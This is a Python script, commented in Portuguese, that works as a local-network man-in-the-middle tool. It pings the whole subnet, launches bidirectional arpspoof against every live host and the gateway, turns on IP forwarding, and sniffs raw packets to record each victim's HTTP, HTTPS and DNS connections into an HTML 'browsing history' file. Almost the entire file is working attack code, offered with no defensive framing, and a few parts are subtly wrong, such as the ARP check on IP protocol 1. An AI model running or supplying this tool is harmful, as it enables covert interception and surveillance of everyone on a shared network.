import os
import socket
import struct
import threading
from queue import Queue
from time import sleep, strftime, time
from datetime import datetime


def get_local_ip():
    """Obtém o IP local automaticamente."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))  # Conexão fictícia para determinar o IP local
        ip = s.getsockname()[0]
    finally:
        s.close()
    return ip


def get_mac(interface):
    """Obtém o endereço MAC da interface de rede."""
    try:
        with open(f'/sys/class/net/{interface}/address') as f:
            return f.read().strip()
    except FileNotFoundError:
        print(f"[!] Interface {interface} não encontrada.")
        return None


def log_to_history(file_path, ip):
    """Registra o IP encontrado no arquivo de histórico."""
    with open(file_path, "a") as history_file:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        history_file.write(f"{timestamp} - IP encontrado: {ip}\n")
        print(f"[+] Registrado no histórico: {ip}")


def is_host_alive(ip):
    """Verifica se um host está ativo enviando um pacote ICMP (ping)."""
    try:
        result = os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1")
        return result == 0
    except Exception as e:
        print(f"[!] Erro ao verificar host {ip}: {e}")
        return False


def discover_hosts(local_ip, active_hosts, history_file, thread_count=50):
    """Realiza a varredura de IPs ativos na sub-rede."""
    subnet = ".".join(local_ip.split(".")[:3])  # Determina a sub-rede (ex.: 192.168.1)
    print(f"[*] Iniciando varredura na sub-rede: {subnet}.0/24")

    ip_queue = Queue()
    for i in range(1, 255):
        ip_queue.put(f"{subnet}.{i}")

    def worker():
        """Thread para verificar se hosts estão ativos."""
        while not ip_queue.empty():
            ip = ip_queue.get()
            if is_host_alive(ip):
                with threading.Lock():
                    if ip not in active_hosts:
                        active_hosts.append(ip)
                        log_to_history(history_file, ip)
            ip_queue.task_done()

    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)

    ip_queue.join()

    for t in threads:
        t.join()

    print("[*] Varredura concluída.")
    print("[*] IPs ativos encontrados:", active_hosts)


def execute_arp_spoof(interface, target_ip, gateway_ip):
    """Executa um ataque ARP spoofing usando a ferramenta arpspoof."""
    print(f"[*] Executando ARP spoofing entre {target_ip} e {gateway_ip}...")
    os.system(f"arpspoof -i {interface} -t {target_ip} {gateway_ip} &")
    os.system(f"arpspoof -i {interface} -t {gateway_ip} {target_ip} &")


def sniff_traffic(interface, target_ip, traffic_data, duration=30):
    """Captura e registra o tráfego HTTP/HTTPS/DNS do alvo."""
    print(f"[*] Monitorando tráfego de {target_ip} por {duration} segundos")
    raw_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
    packets_received = 0  # Contador de pacotes recebidos
    start_time = time()

    try:
        while time() - start_time < duration:
            packet, _ = raw_socket.recvfrom(65565)
            eth_header = packet[:14]
            eth_data = struct.unpack("!6s6sH", eth_header)
            if socket.ntohs(eth_data[2]) == 0x0800:  # IPv4
                ip_header = packet[14:34]
                iph = struct.unpack("!BBHHHBBH4s4s", ip_header)
                protocol = iph[6]
                src_ip = socket.inet_ntoa(iph[8])
                dest_ip = socket.inet_ntoa(iph[9])
                if src_ip == target_ip or dest_ip == target_ip:
                    if protocol == 6:  # TCP
                        tcp_header = packet[34:54]
                        tcph = struct.unpack('!HHLLBBHHH', tcp_header)
                        src_port = tcph[0]
                        dest_port = tcph[1]

                        if src_port == 80 or dest_port == 80:  # HTTP
                            packets_received += 1
                            timestamp = strftime("%Y-%m-%d %H:%M:%S")
                            traffic_data.append(f"<li>{timestamp} - {src_ip} -> {dest_ip} [HTTP]</li>\n")
                        elif src_port == 443 or dest_port == 443:  # HTTPS
                            packets_received += 1
                            timestamp = strftime("%Y-%m-%d %H:%M:%S")
                            traffic_data.append(f"<li>{timestamp} - {src_ip} -> {dest_ip} [HTTPS]</li>\n")

                    elif protocol == 17:  # UDP
                        udp_header = packet[34:42]
                        udph = struct.unpack('!HHHH', udp_header)
                        src_port = udph[0]
                        dest_port = udph[1]

                        if src_port == 53 or dest_port == 53:  # DNS
                            packets_received += 1
                            timestamp = strftime("%Y-%m-%d %H:%M:%S")
                            traffic_data.append(f"<li>{timestamp} - {src_ip} -> {dest_ip} [DNS]</li>\n")

                    # Interpretando resposta ARP
                    elif protocol == 1:  # ARP
                        arp_header = packet[14:42]
                        arph = struct.unpack('!HHBBH6s4s6s4s', arp_header)
                        src_mac = ':'.join('%02x' % b for b in arph[5])
                        src_ip_arp = socket.inet_ntoa(arph[6])
                        dest_mac = ':'.join('%02x' % b for b in arph[7])
                        dest_ip_arp = socket.inet_ntoa(arph[8])
                        if src_ip_arp == target_ip or dest_ip_arp == target_ip:
                            packets_received += 1
                            timestamp = strftime("%Y-%m-%d %H:%M:%S")
                            traffic_data.append(f"<li>{timestamp} - ARP: {src_mac} ({src_ip_arp}) -> {dest_mac} ({dest_ip_arp})</li>\n")

                    if packets_received == 1:  # Primeira ocorrência de tráfego detectado
                        print(f"[+] Tráfego detectado do alvo {target_ip}.")
    except KeyboardInterrupt:
        print(f"[!] Monitoramento de {target_ip} interrompido.")
    finally:
        print(f"[*] Total de pacotes recebidos do alvo {target_ip}: {packets_received}")


def main():
    local_ip = get_local_ip()
    interfaces = os.listdir('/sys/class/net/')
    interface = None
    for iface in interfaces:
        if iface != 'lo':  # Ignora interface de loopback
            interface = iface
            break

    if not interface:
        print("[!] Nenhuma interface de rede válida encontrada.")
        return

    local_mac = get_mac(interface)

    if not local_mac:
        print("[!] Não foi possível obter o endereço MAC local.")
        return

    print(f"[+] Interface detectada: {interface}")
    print(f"[+] IP local: {local_ip}")
    print(f"[+] MAC local: {local_mac}")

    # Habilitar encaminhamento de pacotes
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    active_hosts = []
    history_file = "historico_ips.txt"
    traffic_file = "historico_trafego.html"
    traffic_data = []

    discover_hosts(local_ip, active_hosts, history_file)

    if len(active_hosts) < 1:
        print("[!] Não há IPs suficientes para monitorar o tráfego.")
        return

    gateway_ip = input("Digite o IP do gateway da rede: ")  # Permite definir dinamicamente o IP do gateway
    for target_ip in active_hosts:
        execute_arp_spoof(interface, target_ip, gateway_ip)

    try:
        threads = []
        for target_ip in active_hosts:
            print(f"[*] Monitorando tráfego de {target_ip}...")
            sniff_thread = threading.Thread(target=sniff_traffic, args=(interface, target_ip, traffic_data, 30))
            threads.append(sniff_thread)
            sniff_thread.start()
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("[!] Monitoramento interrompido.")
    finally:
        print("[*] Verificando tabelas ARP...")
        os.system("arp -n")

        # Escrever o arquivo HTML após o monitoramento
        with open(traffic_file, "w") as html_file:
            html_file.write("<html><head><title>Histórico de Navegação</title></head><body><ul>\n")
            html_file.writelines(traffic_data)
            html_file.write("</ul></body></html>\n")
        print(f"[*] Histórico de tráfego salvo em {traffic_file}")


if __name__ == "__main__":
    main()
